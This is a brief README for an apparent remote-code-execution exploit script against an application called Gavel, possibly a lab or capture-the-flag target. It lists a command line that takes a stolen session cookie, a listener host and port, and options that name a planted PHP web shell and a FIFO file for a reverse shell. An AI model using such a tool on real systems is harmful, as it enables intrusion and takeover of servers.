# Gavel RCE

Usage: `python3 gavel_rce.py -s <SESSION_COOKIE> -lh <LHOST> -lp <LPORT> -i <AUCTION_ID>`

The flags `-w` and `-f` are optional:

- `-w`: web shell name (default: "websh.php")
- `-f`: FIFO file name (default: "p")

![](./gavel_rce_poc.png)